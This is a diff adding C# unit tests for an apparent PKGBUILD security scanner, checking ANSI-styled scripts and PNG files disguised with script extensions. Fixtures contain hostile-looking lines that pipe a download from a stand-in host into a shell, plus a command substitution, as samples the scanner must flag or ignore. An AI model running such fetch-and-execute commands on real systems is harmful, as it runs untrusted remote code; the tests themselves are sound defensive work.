@@ -123,6 +123,8 @@ public class PkgBuildSecurityScannerTests
         }
         """;
 
+    private static readonly byte[] PngMagic = [0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A];
+
     private static PkgBuildSecurityScanner CreateScanner()
     {
         return new PkgBuildSecurityScanner();
@@ -652,6 +654,41 @@ public class PkgBuildSecurityScannerTests
     }
 
     [Fact]
+    public void Scan_AnsiStyledInstallScriptlet_StillPatternScanned()
+    {
+        // The dict/yt-cli shape: complete ANSI color sequences only affect terminal output,
+        // so the script stays text and its shell rules still run.
+        var result = Scan(("yt-cli.install",
+            "post_install() {\n" +
+            "  which yarn >/dev/null 2>&1 && yarn install || npm install\n" +
+            "  echo -e \"\\n\u001b[32;1m[+] \u001b[0;1mThank you!\\n\"\n" +
+            "}\n"));
+
+        Assert.Contains(result.Findings, f => string.Equals(f.RuleId, "risky-tool", StringComparison.Ordinal));
+        Assert.DoesNotContain(result.Findings, f => string.Equals(f.RuleId, "local-binary", StringComparison.Ordinal));
+        Assert.Equal(SecurityStatus.Verified, result.Status);
+    }
+
+    [Fact]
+    public void Scan_AnsiStyledPkgBuild_StillScannedByPkgBuildRules()
+    {
+        // The mem-c/lnd-bin shape: ANSI styling in a PKGBUILD must not disable shell or
+        // PKGBUILD-specific rules.
+        var result = Scan(("PKGBUILD",
+            "# \e[1;32mbuild helpers\e[0m\n" +
+            "pkgname=foo\n" +
+            "source=(https://foo.exe)\n" +
+            "build() {\n" +
+            "  curl https://evil.example/x.sh | sh\n" +
+            "}\n"));
+
+        Assert.Contains(result.Findings, f => string.Equals(f.RuleId, "network-to-shell", StringComparison.Ordinal));
+        Assert.Contains(result.Findings, f => string.Equals(f.RuleId, "suspicious-source-url", StringComparison.Ordinal));
+        Assert.DoesNotContain(result.Findings, f => string.Equals(f.RuleId, "local-binary", StringComparison.Ordinal));
+        Assert.Equal(SecurityStatus.Flagged, result.Status);
+    }
+
+    [Fact]
     public void Scan_RawPngIcon_RetainedMediumVerified()
     {
         // burpsuite regression: the real PNG signature is binary, and inert media stays
@@ -665,6 +702,65 @@ public class PkgBuildSecurityScannerTests
         var finding = result.Findings.Single(f => string.Equals(f.RuleId, "local-binary", StringComparison.Ordinal));
         Assert.Equal(FindingSeverity.Medium, finding.Severity);
         Assert.Equal(SecurityStatus.Verified, result.Status);
+    }
+
+    [Theory]
+    [InlineData("icon.png.sh")]
+    [InlineData("icon.png.install")]
+    [InlineData("icon.png.py")]
+    public void Scan_BinaryScriptExtension_OnlyLocalBinaryFinding(string path)
+    {
+        // The extension says "script", but the content is a PNG. Shell-scanning the decoded
+        // bytes would report hidden characters and command substitutions from image data.
+        byte[] png =
+        [
+            .. PngMagic,
+            .. "curl https://evil.example/x | sh\n$(whoami)\n"u8.ToArray(),
+            0x00, 0x01, 0x1B, 0x7F
+        ];
+
+        var result = ScanFiles((path, png));
+
+        var finding = Assert.Single(result.Findings);
+        Assert.Equal("local-binary", finding.RuleId);
+        Assert.Equal(FindingSeverity.Medium, finding.Severity);
+        Assert.Equal(path, finding.Snippet);
+        Assert.Equal(SecurityStatus.Verified, result.Status);
+        Assert.DoesNotContain(result.Findings,
+            f => string.Equals(f.RuleId, "hidden-character", StringComparison.Ordinal) ||
+                 string.Equals(f.RuleId, "command-substitution", StringComparison.Ordinal));
+    }
+
+    [Fact]
+    public void Scan_EquicordStylePngSource_NoShellFindings()
+    {
+        // The reported package's PNG is referenced from source= and contributes only the
+        // non-blocking local-binary finding; decoded image bytes never reach a snippet.
+        const string binaryPayload = "SECRET_IMAGE_PAYLOAD";
+        byte[] png =
+        [
+            .. PngMagic,
+            .. Encoding.UTF8.GetBytes(binaryPayload),
+            0x00, 0x01, 0x02, 0x1B, 0x7F
+        ];
+
+        var result = ScanFiles(
+            ("equicord.png", png),
+            ("equicord.sh", "#!/bin/sh\nexec /usr/bin/equicord \"$@\"\n"u8.ToArray()),
+            ("PKGBUILD", "pkgname=equicord-openasar\npkgver=1.0\nsource=('equicord.png' 'equicord.sh')\nsha256sums=('SKIP' 'SKIP')\n"u8.ToArray()));
+
+        var finding = Assert.Single(result.Findings.Where(f => string.Equals(f.File, "equicord.png", StringComparison.Ordinal)));
+        Assert.Equal("local-binary", finding.RuleId);
+        Assert.Equal(FindingSeverity.Medium, finding.Severity);
+        Assert.Equal("equicord.png", finding.Snippet);
+        Assert.Equal(SecurityStatus.Verified, result.Status);
+        Assert.All(result.Findings, f =>
+        {
+            Assert.DoesNotContain(binaryPayload, f.Snippet, StringComparison.Ordinal);
+            Assert.DoesNotContain(binaryPayload, f.Message, StringComparison.Ordinal);
+            Assert.DoesNotContain('\0', f.Snippet);
+            Assert.DoesNotContain('\uFFFD', f.Snippet);
+        });
     }
 
     [Fact]
